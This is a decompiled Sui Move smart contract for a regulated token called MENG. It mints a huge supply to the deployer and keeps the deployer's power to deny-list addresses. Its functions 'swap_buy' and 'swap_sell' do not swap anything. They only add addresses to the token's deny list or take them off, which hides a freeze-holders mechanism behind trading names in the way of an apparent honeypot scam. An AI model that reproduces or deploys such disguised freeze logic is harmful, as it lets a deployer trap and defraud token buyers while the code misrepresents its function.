module 0x37623ad6adb5b8e5759ffcad305f8402580978ccd5808fdb4ff81548f7a837fb::meng {
    struct MENG has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: MENG, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MENG>(arg0, 9, b"MENG", b"Meng Chong", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmawiBvDW3vcsBRTvhoSSXkYKXHxzjW9q5wjuzvwQEgrFv"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MENG>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MENG>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MENG>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MENG>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MENG>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MENG>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MENG>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MENG>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

